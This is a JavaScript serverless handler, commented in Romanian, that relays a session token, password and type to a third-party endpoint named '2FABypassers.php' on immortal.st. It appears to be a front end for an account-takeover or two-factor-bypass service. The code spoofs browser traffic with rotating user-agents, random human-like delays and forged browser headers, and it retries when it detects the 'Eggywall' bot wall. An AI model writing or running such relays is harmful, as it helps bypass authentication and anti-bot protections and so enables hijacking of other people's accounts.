export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { token, password, type } = req.body;

        if (!token || !password) {
            return res.status(400).json({ error: 'Missing token or password' });
        }

        // Listă de User-Agente reale (rotative)
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];

        // Alege un User-Agent random
        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

        // Delay random între 2-5 secunde (simulează om)
        const delay = Math.floor(Math.random() * 3000) + 2000;
        await new Promise(resolve => setTimeout(resolve, delay));

        // Construiește cookie din token
        const cookieValue = `PHPSESSID=${token}`;

        // Header-e complete ca browser real
        const response = await fetch('https://immortal.st/pages//misc/2FABypassers.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': randomUA,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://immortal.st/dashboard',
                'Origin': 'https://immortal.st',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Cookie': cookieValue,
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            body: JSON.stringify({
                token: token,
                password: password,
                type: type || 'Age'
            })
        });

        const data = await response.text();

        // Verifică dacă e blocat de Eggywall
        if (data.toLowerCase().includes('eggywall') || data.toLowerCase().includes('egg wall')) {
            // Încearcă din nou cu alt User-Agent și delay mai mare
            await new Promise(resolve => setTimeout(resolve, 5000));

            const retryUA = userAgents[Math.floor(Math.random() * userAgents.length)];

            const retryResponse = await fetch('https://immortal.st/pages//misc/2FABypassers.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': retryUA,
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Referer': 'https://immortal.st/dashboard',
                    'Origin': 'https://immortal.st',
                    'Cookie': cookieValue,
                    'Cache-Control': 'no-cache'
                },
                body: JSON.stringify({
                    token: token,
                    password: password,
                    type: type || 'Age'
                })
            });

            const retryData = await retryResponse.text();

            if (retryData.toLowerCase().includes('eggywall')) {
                return res.status(403).json({
                    status: 'error',
                    message: 'Eggywall detected - retry failed',
                    raw: retryData.substring(0, 300)
                });
            }

            return res.status(retryResponse.status)
                .setHeader('Content-Type', 'application/json')
                .send(retryData);
        }

        // Răspuns normal
        res.status(response.status)
            .setHeader('Content-Type', 'application/json')
            .send(data);

    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
}
